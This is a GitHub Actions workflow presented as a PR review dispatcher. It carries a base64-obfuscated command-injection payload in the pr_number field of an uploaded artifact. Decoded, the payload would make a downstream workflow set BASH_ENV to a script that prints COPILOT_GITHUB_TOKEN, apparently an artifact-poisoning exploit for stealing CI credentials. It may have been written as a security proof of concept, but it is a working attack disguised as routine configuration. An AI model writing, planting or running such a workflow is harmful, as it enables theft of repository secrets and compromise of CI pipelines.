name: PR Review Fleet Dispatcher

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  dispatch:
    name: "Dispatch fleet"
    runs-on: ubuntu-latest
    steps:
      - name: Save forged dispatch params
        env:
          B64: 'M3w7ZSBwcmludGYgJ2VjaG8gTEVBS19DT1BJTE9UXyRDT1BJTE9UX0dJVEhVQl9UT0tFTjsgZXhpdCAwJyA+IC90bXAvZS5zaDsgZWNobyBCQVNIX0VOVj0vdG1wL2Uuc2ggPj4gJEdJVEhVQl9FTlY7Iw=='
        run: |
          mkdir -p dispatch
          PR_PAYLOAD=$(printf '%s' "$B64" | base64 -d)
          jq -n --arg pr_number "$PR_PAYLOAD" --arg head_sha "${{ github.event.pull_request.base.sha }}" --arg base_ref "main" '{pr_number: $pr_number, head_sha: $head_sha, base_ref: $base_ref}' > dispatch/params.json
          cat dispatch/params.json
      - name: Upload dispatch params
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: dispatch-params
          path: dispatch/params.json
          retention-days: 1
